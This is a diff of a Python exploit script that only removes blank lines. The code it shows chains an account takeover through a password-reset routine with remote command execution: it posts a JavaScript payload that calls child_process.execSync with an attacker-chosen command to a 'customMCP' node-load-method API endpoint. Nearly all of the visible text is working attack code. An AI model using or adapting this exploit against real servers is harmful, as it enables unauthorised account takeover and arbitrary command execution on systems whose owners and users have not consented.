@@ -55,7 +55,6 @@ try:
 
             def reset_password():
                 status_code = check_if_account_exist()
-                
                 if status_code != 200:
                     headers = {
                         'Content-Type': 'application/json'
@@ -88,15 +87,11 @@ try:
             reset_password()
 
         def rce(email, url, password, cmd):
-
             account_takeover(email, url, password)
-
             session, status_code = login(email, url)
 
             if status_code == 200:
-
                 url_format = "{}/api/v1/node-load-method/customMCP".format(url)
-
                 command = f'({{x:(function(){{const cp = process.mainModule.require("child_process");cp.execSync("{cmd}");return 1;}})()}})'
                 data = {
                     "loadMethod": "listActions",
